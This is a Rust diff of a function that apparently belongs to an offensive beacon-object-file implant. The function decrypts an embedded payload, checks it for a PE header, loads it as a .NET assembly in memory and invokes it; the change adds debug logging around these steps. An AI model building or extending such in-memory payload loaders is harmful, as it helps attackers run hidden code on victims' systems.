@@ -29,25 +29,37 @@ pub fn do_flush(
     tag: &str,
     handle_hex: &str,
 ) {
+    let _ = tag; // suppress unused warning when debug-io off
+
+    crate::dlog2(b"[flush] decrypt_flush");
     let bytes = decrypt_flush();
+    {
+        // Sanity: first byte XOR'd should yield 'M' (0x4D) if asset is
+        // a managed PE. log first 4 bytes for verification.
+        let mut hdr = 0u32;
+        if bytes.len() >= 4 {
+            hdr = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]);
+        }
+        crate::dlog2_hex(b"[flush]   bytes.len=", bytes.len() as u32);
+        crate::dlog2_hex(b"[flush]   first4=", hdr);
+    }
+
+    crate::dlog2(b"[flush] load_assembly");
     match unsafe { crate::netfx::load_assembly(domain, &bytes) } {
         Ok(flush_asm) => {
+            crate::dlog2(b"[flush]   load_assembly ok");
+            crate::dlog2(b"[flush] invoke");
             match unsafe { crate::netfx::invoke(&flush_asm, handle_hex, 0) } {
                 Ok(()) => {
-                    #[cfg(feature = "debug-io")]
-                    rustbof::eprintln!("[dbg] flush {} ok", tag);
+                    crate::dlog2(b"[flush]   invoke ok");
                 }
                 Err(_e) => {
-                    #[cfg(feature = "debug-io")]
-                    rustbof::eprintln!("[dbg] flush {} invoke err: {}", tag, _e.format());
+                    crate::dlog2(b"[flush]   invoke FAILED");
                 }
             }
         }
         Err(_e) => {
-            #[cfg(feature = "debug-io")]
-            rustbof::eprintln!("[dbg] flush {} load err: {}", tag, _e.format());
+            crate::dlog2(b"[flush]   load_assembly FAILED");
         }
     }
-    #[cfg(not(feature = "debug-io"))]
-    let _ = tag;
 }
